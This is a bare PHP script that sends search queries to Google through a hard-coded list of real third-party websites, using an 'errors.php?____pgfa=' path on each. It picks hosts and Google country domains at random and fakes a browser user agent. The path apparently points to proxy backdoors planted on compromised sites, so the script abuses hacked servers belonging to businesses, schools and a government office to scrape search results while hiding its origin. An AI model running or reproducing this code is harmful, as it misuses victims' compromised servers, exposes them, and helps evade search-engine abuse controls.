<?php
$key = $_GET['q'];
$kiwot = urlencode($key);
$spath = $_GET['start'];
$xpath = $_GET['num'];
$lhost = array("www.chemaweyaat.com","aretusasport.altervista.org","www.gruetzi.es","www.ultimartinsurance.co.uk","phamlinh.vn","www.peterborough-sunbed-hire.co.uk","cuongmobile.com.vn","atas.algarvedigital.pt","www.nmsvn.com.vn","www.xedulich.co","www.tarad.in.th","villasayadena.be","www.pdos.com.vn","sevotest.latestdot.eu","www.isankosol.ac.th","www.action-commerciale.biz","web38.trangweb.vn","sts-capital.ru","songoaivuhoabinh.gov.vn","www.toliagroup.gr","www.lespetitsmarins.be","www.104punto9.cl","thpt-phanngoctong-bentre.edu.vn");
$tld = array("asia","ba","bb","bd","cc","co","cm","hk","ng","tr","za","tw","tv","pe","lr","is","fi","eg","aq","vi","sy","ly","mc","pt","ve","uy","eh","gb","vn","wf","uz","tc","ch","sb","sg","sa","sk","ae","ar","at","au","br","ca","cl","cn","com","cz","de","dk","es","eu","fr","hu","id","il","in","info","ir","it","jp","kr","mx","my","net","nl","org","ph","pl","ro","ru","th","ua","uk","us","si","be","biz","co.id","co.kr","ch","cd","com.by","com.br","com.bo","com.bn","no","es","se","ie","tr","gr");
$dom = $tld[rand(0,(count($tld)-1))];
$host = $lhost[rand(0,(count($lhost)-1))];
$path = "/plugins/editors/errors.php?____pgfa=http%3A%2F%2Fwww.google.".$dom."%2Fsearch%3Fq%3D".$kiwot."&num=".$xpath."&start=".$spath;
$uagent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";
$fp = fsockopen($host, 80, $errno, $errstr, 7);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Accept: */*\r\n";
    $out .= "User-Agent: $uagent\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>